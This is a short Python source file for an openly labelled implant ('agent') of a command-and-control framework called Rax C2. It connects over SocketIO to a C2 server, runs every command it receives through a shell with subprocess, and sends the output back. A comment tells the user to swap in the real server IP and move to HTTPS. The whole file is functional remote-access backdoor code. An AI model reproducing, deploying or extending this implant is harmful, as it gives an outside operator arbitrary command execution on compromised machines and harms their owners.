# === agent.py ===
# This is the agent/implant that connects back to the Rax C2 Server.
# It receives commands, executes them locally, and then sends back the results.

import socketio  # For real-time communication with the server
import platform  # Optional: to get system info
import subprocess  # For executing OS-level commands
import uuid  # Generate unique ID for agent
import requests

sio = socketio.Client()  # Create SocketIO client

# Generate a unique identifier for the agent (based on UUID)
agent_id = str(uuid.uuid4())

@sio.event
def connect():
    # When connection to the C2 server is successful
    print("[+] Connected to C2.")
    sio.emit('exec_result', {'id': agent_id, 'output': 'Agent Connected to C2 Successfully'})

@sio.event
def disconnect():
    print("[-] Disconnected from C2")

@sio.on('command')
def on_command(cmd):
    print(f"[>] Received command: {cmd}")
    try:
        # Execute the command
        output = subprocess.check_output(cmd, shell=True, text=True)
        result = output
    except Exception as e:
        result = f"Error: {e}"
    sio.emit('exec_result', {'id': agent_id, 'output': result})

# Connect to the C2 server (replace 127.0.0.1 with actual IP)
# change to https and 443 once the cert function is rectified. ⚠️
sio.connect('http://127.0.0.1:5000')
sio.wait()
